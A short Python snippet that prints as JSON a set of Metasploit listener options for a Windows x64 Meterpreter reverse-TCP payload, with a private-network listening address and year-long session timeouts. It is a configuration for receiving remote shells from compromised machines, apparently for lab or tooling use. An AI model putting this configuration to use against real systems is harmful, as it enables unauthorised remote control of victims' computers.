import json
a = {'opts': {'PAYLOAD': 'windows/x64/meterpreter/reverse_tcp', 'ExitOnSession': False, 'LHOST': '172.16.171.129', 'LPORT': 1234, 'PrependMigrate': False, 'AutoUnhookProcess': False, 'AutoVerifySessionTimeout': 30, 'SessionCommunicationTimeout': 31536000, 'SessionExpirationTimeout': 31536000, 'SessionRetryTotal': 31536000, 'SessionRetryWait': 10, 'StageEncodingFallback': True, 'proxies_proto': 'Direct'}}
print(json.dumps(a))

